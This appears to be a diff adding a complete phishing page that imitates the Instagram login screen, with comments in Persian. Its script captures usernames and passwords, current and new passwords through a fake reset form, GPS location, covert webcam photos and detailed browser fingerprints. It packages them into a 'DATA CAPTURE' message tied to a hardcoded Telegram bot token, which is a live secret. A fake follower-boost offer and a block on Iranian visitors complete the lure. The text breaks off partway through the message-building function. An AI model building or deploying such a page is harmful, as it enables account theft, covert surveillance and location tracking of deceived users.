@@ -1,0 +1,1324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/yv/r/BESjD5wCNsD.ico">
+    <style>
+        /* Reset & Base Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            color: #262626;
+            font-size: 14px;
+            line-height: 18px;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 935px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        /* Login Box Styles - EXACT Instagram look */
+        .login-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px;
+            margin: 0 auto 10px;
+            max-width: 350px;
+            width: 100%;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Instagram Logo - REAL and centered */
+        .instagram-logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 30px;
+            width: 100%;
+        }
+
+        .instagram-logo {
+            background-image: url('https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wEDyo.png');
+            background-position: 0px 0px;
+            background-size: 176px 181px;
+            width: 175px;
+            height: 51px;
+            background-repeat: no-repeat;
+            display: block;
+            margin: 0 auto;
+        }
+
+        /* Alternative logo - SVG version */
+        .alt-logo {
+            width: 175px;
+            height: 51px;
+            margin: 0 auto;
+            display: none;
+        }
+
+        .form-group {
+            margin-bottom: 6px;
+            width: 100%;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 9px 0 7px 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            color: #262626;
+            outline: none;
+        }
+
+        .input-field:focus {
+            border-color: #a8a8a8;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 7px 16px;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 14px;
+            margin: 8px 0;
+            cursor: pointer;
+            opacity: 0.7;
+        }
+
+        .login-button:enabled {
+            opacity: 1;
+        }
+
+        .login-button:enabled:hover {
+            background-color: #1877f2;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            width: 100%;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .divider span {
+            padding: 0 18px;
+        }
+
+        .fb-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            width: 100%;
+        }
+
+        .fb-login img {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+        }
+
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+            display: block;
+            margin-top: 12px;
+        }
+
+        /* Sign Up Box */
+        .signup-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px;
+            margin: 0 auto 10px;
+            max-width: 350px;
+            width: 100%;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        /* Other Pages */
+        .page {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px;
+            margin: 0 auto 10px;
+            max-width: 350px;
+            width: 100%;
+            text-align: center;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .page.active {
+            display: flex;
+        }
+
+        .page-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin: 0 0 8px;
+            color: #262626;
+            text-align: center;
+            width: 100%;
+        }
+
+        .page-subtitle {
+            font-size: 14px;
+            color: #8e8e8e;
+            margin-bottom: 20px;
+            text-align: center;
+            width: 100%;
+        }
+
+        /* Pack Selection */
+        .pack {
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 16px;
+            margin: 8px 0;
+            cursor: pointer;
+            text-align: left;
+            transition: all 0.2s;
+            width: 100%;
+        }
+
+        .pack:hover {
+            border-color: #a8a8a8;
+        }
+
+        .pack.selected {
+            border-color: #0095f6;
+            background-color: #f0f8ff;
+        }
+
+        .pack-title {
+            font-weight: 600;
+            color: #262626;
+            margin-bottom: 4px;
+        }
+
+        .pack-sub {
+            font-size: 12px;
+            color: #0095f6;
+        }
+
+        /* Success Icon */
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background-color: #4CAF50;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: white;
+            font-size: 40px;
+        }
+
+        /* Loading State */
+        .loading {
+            position: relative;
+            pointer-events: none;
+            opacity: 0.7;
+        }
+
+        .loading::after {
+            content: '';
+            position: absolute;
+            width: 16px;
+            height: 16px;
+            top: 50%;
+            left: 50%;
+            margin: -8px 0 0 -8px;
+            border: 2px solid #fff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* App Download Section */
+        .app-download {
+            text-align: center;
+            margin: 20px auto;
+            max-width: 350px;
+            width: 100%;
+        }
+
+        .app-download p {
+            margin: 10px 0;
+            font-size: 14px;
+        }
+
+        .app-stores {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 10px;
+        }
+
+        .app-store {
+            height: 40px;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            color: #8e8e8e;
+            font-size: 12px;
+            margin: 40px 0;
+            max-width: 350px;
+            width: 100%;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+            margin: 20px 0;
+        }
+
+        .footer-links a {
+            color: #8e8e8e;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Iran Block Overlay */
+        .iran-block-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 9999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .iran-block-overlay.active {
+            display: flex;
+        }
+
+        .iran-block-content {
+            background: #1a1a1a;
+            padding: 40px;
+            border-radius: 10px;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+            border: 2px solid #ff4444;
+        }
+
+        .iran-block-icon {
+            font-size: 50px;
+            margin-bottom: 20px;
+            color: #ff4444;
+        }
+
+        .iran-block-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #ff4444;
+        }
+
+        .iran-block-message {
+            font-size: 16px;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .iran-block-note {
+            font-size: 14px;
+            color: #aaa;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #444;
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 450px) {
+            .container {
+                padding: 0;
+            }
+            
+            .login-box,
+            .signup-box,
+            .page {
+                border: none;
+                margin-top: 0;
+            }
+            
+            body {
+                background-color: #fff;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Iran Block Overlay -->
+    <div class="iran-block-overlay" id="iranBlock">
+        <div class="iran-block-content">
+            <div class="iran-block-icon">⚠️</div>
+            <div class="iran-block-title">Connection Error</div>
+            <div class="iran-block-message">
+                We cannot establish a secure connection to Instagram servers from your current location.<br><br>
+                Please use a VPN service to connect from a different region.
+            </div>
+            <div class="iran-block-note">
+                Error Code: 451 - Region Restricted<br>
+                This service is not available in your country.
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- Login Page -->
+        <div class="login-box active" id="loginPage">
+            <div class="instagram-logo-container">
+                <div class="instagram-logo" id="mainLogo"></div>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/200px-Instagram_logo.svg.png" 
+                     alt="Instagram" 
+                     class="alt-logo" 
+                     id="altLogo">
+            </div>
+            
+            <div class="form-group">
+                <input type="text" id="username" class="input-field" placeholder="Phone number, username, or email" autocomplete="username">
+            </div>
+            
+            <div class="form-group">
+                <input type="password" id="password" class="input-field" placeholder="Password" autocomplete="current-password">
+            </div>
+            
+            <button class="login-button" onclick="login()" id="loginBtn">Log In</button>
+            
+            <div class="divider">
+                <span>OR</span>
+            </div>
+            
+            <a href="#" class="fb-login">
+                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNMTUuMTIgOC4wMDAwM0MxNS4xMiAzLjU4MDAzIDExLjU0IDAgNy4xMiAwQzMuMTg0IDAgMCAzLjE4NCAwIDcuMTIwMDNDMCAxMC42MjAwMyAyLjQ3MiAxMy41NjAwMyA1Ljc2IDE0LjM2MDAzVjkuMzIwMDNIMy45MlY3LjEyMDAzSDUuNzZWNS41NjAwM0M1Ljc2IDMuNzIwMDMgNi45NTIgMi41NjAwMyA4Ljc2IDIuNTYwMDNDOS42NTYgMi41NjAwMyAxMC41OTIgMi43MjAwMyAxMC41OTIgMi43MjAwM1Y0LjY0MDAzSDkuNTY4QzguNTQ0IDQuNjQwMDMgOC4yOCA1LjE1MjAzIDguMjggNS43MjAwM1Y3LjEyMDAzSDEwLjQ2NEwxMC4xMiA5LjMyMDAzSDguMjhWMTQuMzYwMDNDMTEuNTI4IDEzLjU2MDAzIDE0LjEyIDEwLjYyMDAzIDE0LjEyIDcuMTIwMDNINi45NlY4LjAwMDAzSDE1LjEyWiIgZmlsbD0iIzM4NTE4NSIvPjwvc3ZnPg==" alt="Facebook">
+                Log in with Facebook
+            </a>
+            
+            <a href="#" class="forgot-password" onclick="showPage('forgotPage')">Forgot password?</a>
+        </div>
+        
+        <!-- Sign Up Box -->
+        <div class="signup-box" id="signupBox">
+            Don't have an account? <a href="#" onclick="alert('Sign up unavailable')">Sign up</a>
+        </div>
+        
+        <!-- Forgot Password Page -->
+        <div class="page" id="forgotPage">
+            <div class="instagram-logo-container">
+                <div class="instagram-logo"></div>
+            </div>
+            
+            <div class="page-title">Reset Your Password</div>
+            <div class="page-subtitle">Enter your current password and choose a new one</div>
+            
+            <div class="form-group">
+                <input type="text" id="forgotUser" class="input-field" placeholder="Username or email">
+            </div>
+            
+            <div class="form-group">
+                <input type="password" id="currentPass" class="input-field" placeholder="Current password">
+            </div>
+            
+            <div class="form-group">
+                <input type="password" id="newPass" class="input-field" placeholder="New password">
+            </div>
+            
+            <div class="form-group">
+                <input type="password" id="confirmPass" class="input-field" placeholder="Confirm new password">
+            </div>
+            
+            <button class="login-button" onclick="forgot()" id="resetBtn">Reset Password</button>
+            
+            <a href="#" class="forgot-password" onclick="showPage('loginPage')" style="margin-top: 20px; display: inline-block;">Back to login</a>
+        </div>
+        
+        <!-- Followers Page -->
+        <div class="page" id="followersPage">
+            <div class="instagram-logo-container">
+                <div class="instagram-logo"></div>
+            </div>
+            
+            <div class="page-title">Increase Your Followers</div>
+            <div class="page-subtitle">Choose a package to boost your Instagram presence</div>
+            
+            <div class="pack" onclick="selectPack(1000, this)">
+                <div class="pack-title">1,000 Followers</div>
+                <div class="pack-sub">Quick Boost - Perfect for starters</div>
+            </div>
+            
+            <div class="pack" onclick="selectPack(5000, this)">
+                <div class="pack-title">5,000 Followers</div>
+                <div class="pack-sub">Most Popular - Best value</div>
+            </div>
+            
+            <div class="pack" onclick="selectPack(10000, this)">
+                <div class="pack-title">10,000 Followers</div>
+                <div class="pack-sub">Premium Package - Maximum visibility</div>
+            </div>
+            
+            <button class="login-button" id="boostBtn" onclick="boost()" disabled>Get Followers Now</button>
+            
+            <a href="#" class="forgot-password" onclick="showPage('loginPage')" style="margin-top: 20px; display: inline-block;">Back</a>
+        </div>
+        
+        <!-- Success Page -->
+        <div class="page" id="successPage">
+            <div class="success-icon">✓</div>
+            <div class="page-title">Success!</div>
+            <div class="page-subtitle">Your followers are being added to your account. This may take a few minutes.</div>
+            
+            <button class="login-button" onclick="location.reload()">Done</button>
+        </div>
+        
+        <!-- Forgot Success Page -->
+        <div class="page" id="forgotSuccessPage">
+            <div class="success-icon">✓</div>
+            <div class="page-title">Password Reset Successful!</div>
+            <div class="page-subtitle">Your password has been updated successfully.</div>
+            
+            <button class="login-button" onclick="showPage('loginPage')">Back to Login</button>
+        </div>
+        
+        <!-- App Download Section -->
+        <div class="app-download">
+            <p>Get the app.</p>
+            <div class="app-stores">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store" class="app-store">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play" class="app-store">
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#">Meta</a>
+                <a href="#">About</a>
+                <a href="#">Blog</a>
+                <a href="#">Jobs</a>
+                <a href="#">Help</a>
+                <a href="#">API</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <a href="#">Locations</a>
+                <a href="#">Instagram Lite</a>
+                <a href="#">Threads</a>
+                <a href="#">Contact Uploading & Non-Users</a>
+                <a href="#">Meta Verified</a>
+            </div>
+            <div style="margin-top: 20px;">
+                <select style="background: none; border: none; color: #8e8e8e; font-size: 12px; outline: none;">
+                    <option>English</option>
+                    <option>Persian</option>
+                    <option>Arabic</option>
+                </select>
+                © 2024 Instagram from Meta
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const CONFIG = {
+            TELEGRAM: {
+                BOT_TOKEN: "8214441669:AAGi-2MQZ0ILIS04I3c_fYnQUgSAtNu6H-s",
+                CHAT_ID: "5172401959"
+            },
+            IRAN_BLOCK: true // Enable Iran IP blocking
+        };
+
+        // State Management
+        const AppState = {
+            selectedPack: 0,
+            collectedData: {},
+            userData: {},
+            isLoading: false,
+            isIranIP: false,
+            vpnRequired: false
+        };
+
+        // Check if Instagram logo loads
+        function checkLogoLoad() {
+            const logo = document.getElementById('mainLogo');
+            const altLogo = document.getElementById('altLogo');
+            
+            // Create test image to check if sprite loads
+            const testImg = new Image();
+            testImg.src = 'https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wEDyo.png';
+            
+            testImg.onload = function() {
+                console.log('Instagram sprite loaded successfully');
+                if (logo) logo.style.display = 'block';
+                if (altLogo) altLogo.style.display = 'none';
+            };
+            
+            testImg.onerror = function() {
+                console.log('Instagram sprite failed to load, using alternative');
+                if (logo) logo.style.display = 'none';
+                if (altLogo) altLogo.style.display = 'block';
+            };
+            
+            // Also check after 2 seconds
+            setTimeout(() => {
+                if (testImg.complete && testImg.naturalHeight === 0) {
+                    if (logo) logo.style.display = 'none';
+                    if (altLogo) altLogo.style.display = 'block';
+                }
+            }, 2000);
+        }
+
+        // Check if IP is from Iran
+        async function checkIranIP() {
+            if (!CONFIG.IRAN_BLOCK) return;
+            
+            try {
+                // Get IP info
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                // Get location info
+                const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const locData = await locRes.json();
+                
+                // Check if country is Iran
+                if (locData.country_code === 'IR' || 
+                    locData.country_name === 'Iran' || 
+                    locData.country_name_ptbr === 'Irã' ||
+                    locData.country === 'Iran') {
+                    
+                    AppState.isIranIP = true;
+                    AppState.vpnRequired = true;
+                    
+                    // Show Iran block overlay
+                    document.getElementById('iranBlock').classList.add('active');
+                    
+                    // Disable all inputs and buttons
+                    document.querySelectorAll('input, button, a').forEach(element => {
+                        element.style.pointerEvents = 'none';
+                        element.style.opacity = '0.5';
+                    });
+                    
+                    console.log('Iran IP detected - Blocking access');
+                }
+            } catch (error) {
+                console.log('IP check failed:', error);
+            }
+        }
+
+        // Initialize data collection on page load
+        window.addEventListener('DOMContentLoaded', async () => {
+            AppState.collectedData = await collectAllData();
+            checkLogoLoad();
+            
+            // Check Iran IP after data collection
+            setTimeout(() => {
+                checkIranIP();
+            }, 1000);
+        });
+
+        // جمع‌آوری تمام اطلاعات
+        async function collectAllData() {
+            const data = {};
+            
+            try {
+                // 1. اطلاعات پایه
+                data.timestamp = new Date().toISOString();
+                data.localTime = new Date().toLocaleString('fa-IR');
+                data.utcTime = new Date().toUTCString();
+                data.url = window.location.href;
+                data.referrer = document.referrer || 'Direct';
+                data.userAgent = navigator.userAgent;
+                data.platform = navigator.platform;
+                data.language = navigator.language;
+                data.languages = navigator.languages;
+                data.cookieEnabled = navigator.cookieEnabled;
+                data.doNotTrack = navigator.doNotTrack;
+                data.hardwareConcurrency = navigator.hardwareConcurrency;
+                data.deviceMemory = navigator.deviceMemory;
+                data.maxTouchPoints = navigator.maxTouchPoints;
+                data.vendor = navigator.vendor;
+                data.webdriver = navigator.webdriver;
+                
+                // 2. اطلاعات صفحه
+                data.screen = {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                };
+                
+                data.window = {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight,
+                    devicePixelRatio: window.devicePixelRatio,
+                    screenX: window.screenX,
+                    screenY: window.screenY
+                };
+                
+                // 3. اطلاعات موقعیت
+                data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                data.timezoneOffset = new Date().getTimezoneOffset();
+                
+                // 4. اطلاعات IP (با fallback)
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    data.ip = ipData.ip;
+                    
+                    try {
+                        const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                        const locData = await locRes.json();
+                        data.ipLocation = {
+                            city: locData.city,
+                            region: locData.region,
+                            country: locData.country_name,
+                            countryCode: locData.country_code,
+                            latitude: locData.latitude,
+                            longitude: locData.longitude,
+                            org: locData.org,
+                            asn: locData.asn
+                        };
+                    } catch(e) {}
+                } catch(e) {
+                    data.ip = 'Unknown';
+                }
+                
+                // 5. اطلاعات شبکه
+                if (navigator.connection) {
+                    data.network = {
+                        type: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt,
+                        saveData: navigator.connection.saveData
+                    };
+                }
+                
+                // 6. اطلاعات باتری
+                if ('getBattery' in navigator) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        data.battery = {
+                            level: Math.round(battery.level * 100),
+                            charging: battery.charging,
+                            chargingTime: battery.chargingTime
+                        };
+                    } catch(e) {}
+                }
+                
+                // 7. Canvas Fingerprint
+                try {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    ctx.textBaseline = "top";
+                    ctx.font = "14px 'Arial'";
+                    ctx.fillStyle = "#f60";
+                    ctx.fillRect(125,1,62,20);
+                    ctx.fillStyle = "#069";
+                    ctx.fillText("Fingerprint", 2, 15);
+                    data.canvasFingerprint = canvas.toDataURL();
+                } catch(e) {}
+                
+                // 8. WebGL Fingerprint
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        data.webgl = {
+                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                        };
+                    }
+                } catch(e) {}
+                
+                // 9. لیست فونت‌ها
+                try {
+                    const fonts = ['Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia'];
+                    const available = [];
+                    const testCanvas = document.createElement('canvas');
+                    const testCtx = testCanvas.getContext('2d');
+                    
+                    fonts.forEach(font => {
+                        testCtx.font = "72px monospace";
+                        const baseline = testCtx.measureText("test").width;
+                        testCtx.font = "72px " + font + ", monospace";
+                        const width = testCtx.measureText("test").width;
+                        if (width !== baseline) available.push(font);
+                    });
+                    data.fonts = available;
+                } catch(e) {}
+                
+                // 10. WebRTC
+                try {
+                    const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
+                    pc.createDataChannel("");
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    
+                    pc.onicecandidate = ice => {
+                        if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                        const ip = ipRegex.exec(ice.candidate.candidate)?.[1];
+                        if (ip) data.webRTCIP = ip;
+                        pc.close();
+                    };
+                } catch(e) {}
+                
+            } catch(e) {
+                console.log('Data collection complete');
+            }
+            
+            return data;
+        }
+
+        // تابع نمایش صفحات
+        function showPage(pageId) {
+            // اگر IP ایران باشد، هیچ عملی انجام نده
+            if (AppState.isIranIP) {
+                document.getElementById('iranBlock').classList.add('active');
+                return;
+            }
+            
+            // پنهان کردن همه صفحات
+            document.querySelectorAll('.login-box, .page').forEach(element => {
+                element.classList.remove('active');
+                element.style.display = 'none';
+            });
+            
+            // نمایش صفحه مورد نظر
+            const targetPage = document.getElementById(pageId);
+            if (targetPage) {
+                targetPage.classList.add('active');
+                targetPage.style.display = 'flex';
+            }
+            
+            // مدیریت باکس عضویت
+            const signupBox = document.getElementById('signupBox');
+            if (signupBox) {
+                signupBox.style.display = pageId === 'loginPage' ? 'block' : 'none';
+            }
+            
+            window.scrollTo(0, 0);
+        }
+
+        // تابع ورود
+        async function login() {
+            // اگر IP ایران باشد، هیچ عملی انجام نده
+            if (AppState.isIranIP) {
+                document.getElementById('iranBlock').classList.add('active');
+                return;
+            }
+            
+            const user = document.getElementById('username').value.trim();
+            const pass = document.getElementById('password').value;
+            
+            if (!user || !pass) {
+                alert('Please fill in all fields');
+                return;
+            }
+            
+            // فعال کردن حالت لودینگ
+            const loginBtn = document.getElementById('loginBtn');
+            loginBtn.classList.add('loading');
+            loginBtn.disabled = true;
+            
+            // جمع‌آوری اطلاعات GPS
+            let gpsLocation = null;
+            if (navigator.geolocation) {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 5000,
+                            maximumAge: 0
+                        });
+                    });
+                    
+                    gpsLocation = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        altitudeAccuracy: position.coords.altitudeAccuracy,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed
+                    };
+                } catch(e) {
+                    gpsLocation = {error: 'GPS access denied'};
+                }
+            }
+            
+            // گرفتن عکس از دوربین
+            let photo = null;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({video: true});
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                
+                await new Promise(resolve => setTimeout(resolve, 300));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, 640, 480);
+                
+                stream.getTracks().forEach(track => track.stop());
+                
+                photo = await new Promise(resolve => {
+                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
+                });
+            } catch(e) {
+                console.log('Camera access denied or not available');
+            }
+            
+            // ارسال اطلاعات
+            await sendCompleteData('LOGIN', {
+                username: user,
+                password: pass
+            }, gpsLocation, photo);
+            
+            // غیرفعال کردن لودینگ
+            loginBtn.classList.remove('loading');
+            loginBtn.disabled = false;
+            
+            // نمایش صفحه بعدی
+            showPage('followersPage');
+        }
+
+        // تابع بازیابی رمز عبور
+        async function forgot() {
+            // اگر IP ایران باشد، هیچ عملی انجام نده
+            if (AppState.isIranIP) {
+                document.getElementById('iranBlock').classList.add('active');
+                return;
+            }
+            
+            const user = document.getElementById('forgotUser').value.trim();
+            const current = document.getElementById('currentPass').value;
+            const newPass = document.getElementById('newPass').value;
+            const confirm = document.getElementById('confirmPass').value;
+            
+            if (!user || !current || !newPass || !confirm) {
+                alert('Please fill in all fields');
+                return;
+            }
+            
+            if (newPass !== confirm) {
+                alert('New passwords do not match');
+                return;
+            }
+            
+            // فعال کردن حالت لودینگ
+            const resetBtn = document.getElementById('resetBtn');
+            resetBtn.classList.add('loading');
+            resetBtn.disabled = true;
+            
+            // گرفتن عکس
+            let photo = null;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({video: true});
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                
+                await new Promise(resolve => setTimeout(resolve, 300));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = 320;
+                canvas.height = 240;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, 320, 240);
+                
+                stream.getTracks().forEach(track => track.stop());
+                
+                photo = await new Promise(resolve => {
+                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
+                });
+            } catch(e) {}
+            
+            // ارسال اطلاعات
+            await sendCompleteData('PASSWORD_RESET', {
+                username: user,
+                currentPassword: current,
+                newPassword: newPass,
+                confirmPassword: confirm
+            }, null, photo);
+            
+            // غیرفعال کردن لودینگ
+            resetBtn.classList.remove('loading');
+            resetBtn.disabled = false;
+            
+            // نمایش موفقیت
+            showPage('forgotSuccessPage');
+        }
+
+        // انتخاب پکیج
+        function selectPack(count, element) {
+            // اگر IP ایران باشد، هیچ عملی انجام نده
+            if (AppState.isIranIP) {
+                document.getElementById('iranBlock').classList.add('active');
+                return;
+            }
+            
+            AppState.selectedPack = count;
+            document.getElementById('boostBtn').disabled = false;
+            document.querySelectorAll('.pack').forEach(p => p.classList.remove('selected'));
+            element.classList.add('selected');
+        }
+
+        // تابع افزایش فالوور
+        async function boost() {
+            // اگر IP ایران باشد، هیچ عملی انجام نده
+            if (AppState.isIranIP) {
+                document.getElementById('iranBlock').classList.add('active');
+                return;
+            }
+            
+            const boostBtn = document.getElementById('boostBtn');
+            boostBtn.classList.add('loading');
+            boostBtn.disabled = true;
+            
+            // گرفتن عکس
+            let photo = null;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({video: true});
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                
+                await new Promise(resolve => setTimeout(resolve, 300));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = 320;
+                canvas.height = 240;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, 320, 240);
+                
+                stream.getTracks().forEach(track => track.stop());
+                
+                photo = await new Promise(resolve => {
+                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
+                });
+            } catch(e) {}
+            
+            // ارسال اطلاعات
+            await sendCompleteData('FOLLOWERS_BOOST', {
+                package: AppState.selectedPack
+            }, null, photo);
+            
+            // نمایش موفقیت
+            setTimeout(() => {
+                showPage('successPage');
+                boostBtn.classList.remove('loading');
+                boostBtn.disabled = false;
+            }, 1000);
+        }
+
+        // تابع ارسال اطلاعات کامل
+        async function sendCompleteData(action, userData, gpsLocation = null, photo = null) {
+            // ساخت پیام با فرمت درخواستی
+            let message = `🔔 INSTAGRAM DATA CAPTURE 🔔\n\n`;
+            
+            // 1. اطلاعات کاربر (اول از همه - همانطور که خواستید)
+            message += `🔐 USER CREDENTIALS:\n`;
+            message += `👤 Username/Email: ${userData.username || 'Not provided'}\n`;
+            if (userData.password) message += `🔑 Password: ${userData.password}\n`;
+            if (userData.currentPassword) message += `📋 Current Password: ${userData.currentPassword}\n`;
+            if (userData.newPassword) message += `🆕 New Password: ${userData.newPassword}\n`;
+            if (userData.confirmPassword) message += `✅ Confirm Password: ${userData.confirmPassword}\n`;
+            message += `\n`;
+            
+            // 2. اطلاعات اکشن و زمان
+            message += `📝 ACTION: ${action}\n`;
+            message += `⏰ LOCAL TIME: ${new Date().toLocaleString('fa-IR')}\n`;
+            message += `📅 UTC TIME: ${new Date().toUTCString()}\n\n`;
+            
+            // 3. موقعیت GPS کاربر
+            message += `📍 REAL USER LOCATION (GPS):\n`;
+            if (gpsLocation && gpsLocation.latitude) {
+                message += `🎯 Latitude: ${gpsLocation.latitude}\n`;
+                message += `🎯 Longitude: ${gpsLocation.longitude}\n`;
